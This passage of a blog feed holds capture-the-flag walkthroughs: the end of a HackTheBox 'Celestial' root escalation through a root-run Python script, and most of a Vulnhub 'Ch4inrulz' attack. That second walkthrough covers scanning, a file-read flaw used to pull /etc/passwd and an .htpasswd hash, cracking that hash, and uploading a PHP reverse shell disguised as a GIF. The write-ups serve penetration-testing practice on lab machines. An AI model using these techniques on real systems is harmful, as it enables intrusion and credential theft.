-rw-rw-r--  1 sun sun   29 Sep 21  2017 script.py
-rw-rw-r--  1 sun sun   33 Sep 21  2017 user.txt
$ /bin/bash
/bin/bash
sun@sun:~/Documents$ ls -la
ls -la
total 16
drwxr-xr-x  2 sun sun 4096 Jul 10 16:06 .
drwxr-xr-x 21 sun sun 4096 Jul 10 16:04 ..
-rw-rw-r--  1 sun sun   29 Sep 21  2017 script.py
-rw-rw-r--  1 sun sun   33 Sep 21  2017 user.txt
sun@sun:~$ echo &quot;import os
echo &quot;import os
&amp;gt; print(os.system('ls -la /root'))&quot; &amp;gt; Documents/script.py
print(os.system('ls -la /root'))&quot; &amp;gt; Documents/script.py
sun@sun:~$ cat Documents/script.py
cat Documents/script.py
import os
print(os.system('ls -la /root'))
sun@sun:~$ cat output.txt
cat output.txt
Script is running...
sun@sun:~$ ls -la output.txt
ls -la output.txt
-rw-r--r-- 1 root root 565 Jul 12 04:35 output.txt
sun@sun:~$ cat output.txt
cat output.txt
total 44
drwx------  5 root root 4096 Mar  4 10:12 .
drwxr-xr-x 24 root root 4096 Sep 19  2017 ..
-rw-------  1 root root    1 Mar  4 15:25 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jul 19  2016 .cache
drwx------  3 root root 4096 Sep 20  2017 .gnupg
drwxr-xr-x  2 root root 4096 Sep 19  2017 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Sep 21  2017 root.txt
-rw-r--r--  1 root root   29 Mar  4 10:12 script.py
-rw-r--r--  1 root root   74 Mar  4 10:10 .selected_editor&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;By waiting for another execution, we know where is flag for the root. Now let’s view it using the same trick.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sun@sun:~$ echo &quot;import os
echo &quot;import os
&amp;gt; print(os.system('cat /root/root.txt'))&quot; &amp;gt; Documents/script.py
print(os.system('cat /root/root.txt'))&quot; &amp;gt; Documents/script.py
sun@sun:~$ cat Documents/script.py
cat Documents/script.py
import os
print(os.system('cat /root/root.txt'))
sun@sun:~$ ls -la
ls -la
total 152
drwxr-xr-x 21 sun  sun  4096 Jul 12 04:45 .
drwxr-xr-x  3 root root 4096 Sep 19  2017 ..
-rw-------  1 sun  sun     1 Mar  4 15:24 .bash_history
-rw-r--r--  1 sun  sun   220 Sep 19  2017 .bash_logout
-rw-r--r--  1 sun  sun  3771 Sep 19  2017 .bashrc
drwx------ 13 sun  sun  4096 Nov  8  2017 .cache
drwx------ 16 sun  sun  4096 Sep 20  2017 .config
drwx------  3 root root 4096 Sep 21  2017 .dbus
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Desktop
-rw-r--r--  1 sun  sun    25 Sep 19  2017 .dmrc
drwxr-xr-x  2 sun  sun  4096 Jul 12 04:48 Documents
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Downloads
-rw-r--r--  1 sun  sun  8980 Sep 19  2017 examples.desktop
drwx------  2 sun  sun  4096 Sep 21  2017 .gconf
drwx------  3 sun  sun  4096 Jul 12 04:45 .gnupg
drwx------  2 root root 4096 Sep 21  2017 .gvfs
-rw-------  1 sun  sun  6732 Jul 12 04:45 .ICEauthority
drwx------  3 sun  sun  4096 Sep 19  2017 .local
drwx------  4 sun  sun  4096 Sep 19  2017 .mozilla
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Music
drwxrwxr-x  2 sun  sun  4096 Sep 19  2017 .nano
drwxr-xr-x 47 root root 4096 Sep 19  2017 node_modules
-rw-rw-r--  1 sun  sun    20 Sep 19  2017 .node_repl_history
drwxrwxr-x 57 sun  sun  4096 Sep 19  2017 .npm
-rw-r--r--  1 root root   21 Mar  4 15:40 output.txt
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Pictures
-rw-r--r--  1 sun  sun   655 Sep 19  2017 .profile
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Public
-rw-rw-r--  1 sun  sun    66 Sep 20  2017 .selected_editor
-rw-rw-r--  1 sun  sun   870 Sep 20  2017 server.js
-rw-r--r--  1 sun  sun     0 Sep 19  2017 .sudo_as_admin_successful
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Templates
drwxr-xr-x  2 sun  sun  4096 Sep 19  2017 Videos
-rw-------  1 sun  sun    48 Jul 12 04:45 .Xauthority
-rw-------  1 sun  sun    82 Jul 12 04:45 .xsession-errors
-rw-------  1 sun  sun  1302 Mar  7 08:33 .xsession-errors.old
sun@sun:~$ cat output.txt
cat output.txt
Script is running...
sun@sun:~$ cat Documents/script.py
cat Documents/script.py
import os
print(os.system('cat /root/root.txt'))
sun@sun:~$ cat output.txt
cat output.txt
Script is running...
sun@sun:~$ cat output.txt
cat output.txt

0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;At last, delete the &lt;code class=&quot;highlighter-rouge&quot;&gt;output.txt&lt;/code&gt; and empty the script to do not share the flag with other attackers.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sun@sun:~$ rm output.txt
rm output.txt
rm: remove write-protected regular file 'output.txt'? y
y
sun@sun:~$ echo &quot;&quot; &amp;gt; Documents/script.py
echo &quot;&quot; &amp;gt; Documents/script.py&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
</description>
        <pubDate>Sat, 25 Aug 2018 02:00:00 +0200</pubDate>
        <link>http://localhost:4000/hackthebox-celestial/</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox-celestial/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Ch4inrulz</title>
        <description>&lt;p&gt;Today we’re going to walk through a machine from Vulnhub called &lt;strong&gt;Ch4inrulz&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Frank has a small website and he is a smart developer with a normal security background , he always love to follow patterns , your goal is to discover any critical vulnerabilities and gain access to the system , then you need to gain root access in order to capture the root flag.

This machine was made for Jordan’s Top hacker 2018 CTF , we tried to make it simulate a real world attacks in order to improve your penetration testing skills.

The machine was tested on vmware (player / workstation) and works without any problems , so we recommend to use VMware to run it , Also works fine using virtualbox.

Difficulty: Intermediate , you need to think out of the box and collect all the puzzle pieces in order to get the job done.

The machine is already got DHCP enabled , so you will not have any problems with networking.

Happy Hacking !

v1 - 25/07/2018 v1.0.1 - 31/07/2018 *Fixes DHCP Issue*  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/@mohammadaskar2&quot;&gt;mohammadaskar2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/ch4inrulz-101,247/&quot;&gt;https://www.vulnhub.com/entry/ch4inrulz-101,247/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;Firstly, we can do an &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -sC -sV -sS -A -v 10.0.0.14
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-09 12:36 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:36
Completed NSE at 12:36, 0.00s elapsed
Initiating NSE at 12:36
Completed NSE at 12:36, 0.00s elapsed
Initiating ARP Ping Scan at 12:36
Scanning 10.0.0.14 [1 port]
Completed ARP Ping Scan at 12:36, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:36
Completed Parallel DNS resolution of 1 host. at 12:36, 0.00s elapsed
Initiating SYN Stealth Scan at 12:36
Scanning 10.0.0.14 [1000 ports]
Discovered open port 80/tcp on 10.0.0.14
Discovered open port 22/tcp on 10.0.0.14
Discovered open port 21/tcp on 10.0.0.14
Discovered open port 8011/tcp on 10.0.0.14
Completed SYN Stealth Scan at 12:36, 0.12s elapsed (1000 total ports)
Initiating Service scan at 12:36
Scanning 4 services on 10.0.0.14
Completed Service scan at 12:36, 11.03s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.14
NSE: Script scanning 10.0.0.14.
Initiating NSE at 12:36
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 12:36, 0.77s elapsed
Initiating NSE at 12:36
Completed NSE at 12:36, 0.00s elapsed
Nmap scan report for 10.0.0.14
Host is up (0.00064s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.5
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.0.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 2.3.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d4:f8:c1:55:92:75:93:f7:7b:65:dd:2b:94:e8:bb:47 (DSA)
|   2048 3d:24:ea:4f:a2:2a:ca:63:b7:f4:27:0f:d9:17:03:22 (RSA)
|_  256 e2:54:a7:c7:ef:aa:8c:15:61:20:bd:aa:72:c0:17:88 (ECDSA)
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: FRANK's Website | Under development
8011/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:99:7D:E7 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.19 - 2.6.36
Uptime guess: 497.101 days (since Thu Mar 30 10:11:48 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=198 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.64 ms 10.0.0.14

NSE: Script Post-scanning.
Initiating NSE at 12:36
Completed NSE at 12:36, 0.00s elapsed
Initiating NSE at 12:36
Completed NSE at 12:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
           Raw packets sent: 1020 (45.626KB) | Rcvd: 1016 (41.354KB)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can see a whole range of open ports &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;8011&lt;/code&gt; for &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; servers, &lt;code class=&quot;highlighter-rouge&quot;&gt;21&lt;/code&gt; for &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;22&lt;/code&gt; for &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt;. From the start I decided to check the &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; port for some publicly available files.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# ftp 10.0.0.14
Connected to 10.0.0.14.
220 (vsFTPd 2.3.5)
Name (10.0.0.14:root): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        111          4096 Apr 13 17:19 .
drwxr-xr-x    2 0        111          4096 Apr 13 17:19 ..
226 Directory send OK.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately there’s nothing in there, so my next step was to check &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; at port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt;. As it’s pretty normal landing page, I decided to run a &lt;code class=&quot;highlighter-rouge&quot;&gt;dirb&lt;/code&gt; scan for directories.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# dirb http://10.0.0.14

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Aug 20 04:09:45 2018
URL_BASE: http://10.0.0.14/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.14/ ----
+ http://10.0.0.14/cgi-bin/ (CODE:403|SIZE:285)                                
==&amp;gt; DIRECTORY: http://10.0.0.14/css/                                           
+ http://10.0.0.14/development (CODE:401|SIZE:476)                             
==&amp;gt; DIRECTORY: http://10.0.0.14/img/                                           
+ http://10.0.0.14/index (CODE:200|SIZE:334)                                   
+ http://10.0.0.14/index.html (CODE:200|SIZE:13516)                            
==&amp;gt; DIRECTORY: http://10.0.0.14/js/                                            
+ http://10.0.0.14/LICENSE (CODE:200|SIZE:1093)                                
+ http://10.0.0.14/robots (CODE:200|SIZE:21)                                   
+ http://10.0.0.14/robots.txt (CODE:200|SIZE:21)                               
+ http://10.0.0.14/server-status (CODE:403|SIZE:290)                           
==&amp;gt; DIRECTORY: http://10.0.0.14/vendor/                                        
                                                                               
---- Entering directory: http://10.0.0.14/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.14/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.14/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.14/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon Aug 20 04:09:49 2018
DOWNLOADED: 4612 - FOUND: 8&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here, we can see a &lt;code class=&quot;highlighter-rouge&quot;&gt;development&lt;/code&gt; directory, which is protected by password, so I decided to move on and scan another &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; port - &lt;code class=&quot;highlighter-rouge&quot;&gt;8011&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.0.0.14:8011 -x .txt,.php,.html

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.0.0.14:8011/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307
[+] Extensions   : .txt,.php,.html
=====================================================
/index.html (Status: 200)
/api (Status: 301)
=====================================================&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;An &lt;code class=&quot;highlighter-rouge&quot;&gt;/api/&lt;/code&gt; directory? Let’s check that.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.14:8011/api/
&amp;lt;title&amp;gt;FRANK's API | Under development&amp;lt;/title&amp;gt;

&amp;lt;center&amp;gt;&amp;lt;h2&amp;gt;This API will be used to communicate with Frank's server&amp;lt;/h2&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;but it's still under development&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;* web_api.php&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;* records_api.php&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;* files_api.php&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;
&amp;lt;center&amp;gt;&amp;lt;p&amp;gt;* database_api.php&amp;lt;/p&amp;gt;&amp;lt;/center&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;By checking all of these files, only &lt;code class=&quot;highlighter-rouge&quot;&gt;files_api.php&lt;/code&gt; is present.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.14:8011/api/web_api.php
&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;The requested URL /api/web_api.php was not found on this server.&amp;lt;/p&amp;gt;
&amp;lt;hr&amp;gt;
&amp;lt;address&amp;gt;Apache/2.2.22 (Ubuntu) Server at 10.0.0.14 Port 8011&amp;lt;/address&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
root@kali:~# curl 10.0.0.14:8011/api/records_api.php
&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;The requested URL /api/records_api.php was not found on this server.&amp;lt;/p&amp;gt;
&amp;lt;hr&amp;gt;
&amp;lt;address&amp;gt;Apache/2.2.22 (Ubuntu) Server at 10.0.0.14 Port 8011&amp;lt;/address&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
root@kali:~# curl 10.0.0.14:8011/api/files_api.php

&amp;lt;head&amp;gt;
  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;p&amp;gt;No parameter called file passed to me&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;* Note : this API don't use json , so send the file name in raw format&amp;lt;/p&amp;gt;
root@kali:~# curl 10.0.0.14:8011/api/database_api.php
&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
&amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;The requested URL /api/database_api.php was not found on this server.&amp;lt;/p&amp;gt;
&amp;lt;hr&amp;gt;
&amp;lt;address&amp;gt;Apache/2.2.22 (Ubuntu) Server at 10.0.0.14 Port 8011&amp;lt;/address&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can see that it needs a &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; parameter, which we can do with &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl http://10.0.0.14:8011/api/files_api.php?file=index.php

&amp;lt;head&amp;gt;
  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;b&amp;gt;********* HACKER DETECTED *********&amp;lt;/b&amp;gt;&amp;lt;p&amp;gt;YOUR IP IS : 10.0.0.4&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;WRONG INPUT !!&amp;lt;/p&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hmmm, it blocks our request. After a while of trying out different things, I’ve noticed that changing &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; TO &lt;code class=&quot;highlighter-rouge&quot;&gt;POST&lt;/code&gt; will allow us to return the correct ouptut - contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl -X POST -d file=/etc/passwd 10.0.0.14:8011/api/files_api.php

&amp;lt;head&amp;gt;
  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;

root:x:0:0:root:/root:/bin/bash
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
frank:x:1000:1000:frank,,,:/home/frank:/bin/bash
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:111:ftp daemon,,,:/srv/ftp:/bin/false&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Okay, so as we can read files with that &lt;code class=&quot;highlighter-rouge&quot;&gt;api&lt;/code&gt;, why don’t we try and read the content of the &lt;code class=&quot;highlighter-rouge&quot;&gt;index&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;development&lt;/code&gt; area?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl -X POST -d file=/var/www/development/index.html 10.0.0.14:8011/api/files_api.php

&amp;lt;head&amp;gt;
  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;title&amp;gt;my Development tools&amp;lt;/title&amp;gt;
&amp;lt;b&amp;gt;* Here is my unfinished tools list&amp;lt;/b&amp;gt;

&amp;lt;h4&amp;gt;- the uploader tool (finished but need security review)&amp;lt;/h4&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;More information, there’s possibly a tool to upload files. But still, we need to get access so we can use it. For now only reading is possible.&lt;/p&gt;

&lt;p&gt;But as the protection is from the web server itself, we could possibly find information about in &lt;code class=&quot;highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt; file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl -X POST -d file=/var/www/development/.htaccess 10.0.0.14:8011/api/files_api.php

&amp;lt;head&amp;gt;
  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;

AuthUserFile /etc/.htpasswd
AuthName &quot;Frank Development Area&quot;
AuthType Basic
AuthGroupFile /dev/null

&amp;lt;Limit GET POST&amp;gt;

require valid-user

&amp;lt;/Limit&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, let’s get the &lt;code class=&quot;highlighter-rouge&quot;&gt;.htpasswd&lt;/code&gt; file with the password to protected area.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl -X POST -d file=/etc/.htpasswd 10.0.0.14:8011/api/files_api.php

&amp;lt;head&amp;gt;
  &amp;lt;title&amp;gt;franks website | simple website browser API&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;

frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can crack the password with &lt;code class=&quot;highlighter-rouge&quot;&gt;johntheripper&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# echo 'frank:$apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0' &amp;gt; pass.txt
root@kali:~# john pass.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
frank!!!         (frank)
1g 0:00:00:00 DONE 1/3 (2018-08-14 09:10) 33.33g/s 6266p/s 6266c/s 6266C/s frank!!..fr4nk
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Not a hard password to brute force.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/ch4inrulz/development.png&quot; alt=&quot;Development Area&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After logging in in, we can already move to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/uploader&lt;/code&gt; tool as previously discovered.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/ch4inrulz/uploader.png&quot; alt=&quot;Uploader&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By uploading some test files, I’ve noticed that we can only upload images. But we can try to trick it by getting &lt;code class=&quot;highlighter-rouge&quot;&gt;php-reverse-shell&lt;/code&gt; and adding &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; file header into the exploit.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# vi php-reverse-shell.php
root@kali:~# file php-reverse-shell.php
php-reverse-shell.php: GIF image data, version 89a, 2570 x 16188
root@kali:~# cat php-reverse-shell.php
GIF89a

&amp;lt;?php

File is an image - image/gif.Sorry, only JPG, JPEG, PNG &amp;amp; GIF files are allowed.Sorry, your file was not uploaded. &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In addition, we have to change the extension of the shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# mv php-reverse-shell.php php-reverse-shell.gif

File is an image - image/gif.The file php-reverse-shell.gif has been uploaded to my uploads path. &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we have to find the &lt;code class=&quot;highlighter-rouge&quot;&gt;upload&lt;/code&gt; path. This was the most time consuming part as &lt;code class=&quot;highlighter-rouge&quot;&gt;dirb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with different wordlists didn’t seem to find anything valuable. In addition, there were no clues in the system.&lt;/p&gt;

